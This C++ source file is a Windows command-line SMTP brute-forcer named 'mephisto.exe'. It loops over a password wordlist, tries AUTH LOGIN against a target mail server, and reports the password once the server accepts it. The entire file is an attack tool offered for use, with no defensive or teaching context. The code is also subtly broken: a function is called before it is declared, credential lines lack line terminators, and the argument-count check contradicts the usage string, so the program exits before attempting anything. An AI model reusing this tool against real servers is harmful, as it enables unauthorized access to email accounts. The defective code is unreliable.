#include <iostream>
#include <fstream>
#include <string>
#include <winsock2.h>
#include <thread>

#pragma comment(lib, "ws2_32.lib")

// Function to initialize winsock
bool initWinsock() {
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData) == 0;
}

// Function to clean up winsock
void cleanupWinsock() {
    WSACleanup();
}

// Function to connect to SMTP server and try to authenticate
bool bruteForceSMTP(const std::string& smtpServer, const std::string& username, const std::string& password, const std::string& port) {
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[1024];
    std::string response;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed." << std::endl;
        return false;
    }

    // Set up server structure
    server.sin_family = AF_INET;
    server.sin_port = htons(std::stoi(port));
    server.sin_addr.s_addr = inet_addr(smtpServer.c_str());

    // Connect to server
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cerr << "Connection to server failed." << std::endl;
        closesocket(sock);
        return false;
    }

    // Read server's greeting
    int recvSize = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (recvSize > 0) {
        buffer[recvSize] = '\0';
        response = buffer;
    }

    // Send EHLO command
    std::string ehloCmd = "EHLO " + smtpServer + "\r\n";
    send(sock, ehloCmd.c_str(), ehloCmd.length(), 0);

    // Read response
    recvSize = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (recvSize > 0) {
        buffer[recvSize] = '\0';
        response = buffer;
    }

    // Send AUTH LOGIN command
    send(sock, "AUTH LOGIN\r\n", 12, 0);

    // Read server's response
    recvSize = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (recvSize > 0) {
        buffer[recvSize] = '\0';
        response = buffer;
    }

    // Send base64 encoded username
    std::string encodedUsername = base64_encode(username); // Implement base64 encoding
    send(sock, encodedUsername.c_str(), encodedUsername.length(), 0);

    // Read response
    recvSize = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (recvSize > 0) {
        buffer[recvSize] = '\0';
        response = buffer;
    }

    // Send base64 encoded password
    std::string encodedPassword = base64_encode(password); // Implement base64 encoding
    send(sock, encodedPassword.c_str(), encodedPassword.length(), 0);

    // Read response
    recvSize = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (recvSize > 0) {
        buffer[recvSize] = '\0';
        response = buffer;
        if (response.find("235") != std::string::npos) {
            std::cout << "KEY FOUND: " << password << std::endl;
            closesocket(sock);
            return true;
        }
    }

    // If login fails, close connection
    closesocket(sock);
    return false;
}

// Function to base64 encode a string
std::string base64_encode(const std::string &in) {
    static const std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

// Function to brute force from wordlist
void bruteForceFromFile(const std::string& smtpServer, const std::string& username, const std::string& wordlistPath, const std::string& port) {
    std::ifstream wordlist(wordlistPath);
    std::string password;
    
    if (!wordlist.is_open()) {
        std::cerr << "Could not open wordlist file!" << std::endl;
        return;
    }

    while (std::getline(wordlist, password)) {
        if (bruteForceSMTP(smtpServer, username, password, port)) {
            std::cout << "Password found: " << password << std::endl;
            break;
        }
    }

    wordlist.close();
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: mephisto.exe -l <username> -P <path_to_wordlist> <smtp_server> <port>" << std::endl;
        return -1;
    }

    std::string username, wordlistPath, smtpServer, port;
    
    for (int i = 1; i < argc; i++) {
        if (std::string(argv[i]) == "-l") {
            username = argv[++i];
        } else if (std::string(argv[i]) == "-P") {
            wordlistPath = argv[++i];
        } else if (smtpServer.empty()) {
            smtpServer = argv[i];
        } else if (port.empty()) {
            port = argv[i];
        }
    }

    if (initWinsock()) {
        bruteForceFromFile(smtpServer, username, wordlistPath, port);
        cleanupWinsock();
    } else {
        std::cerr << "Failed to initialize Winsock." << std::endl;
    }

    return 0;
}
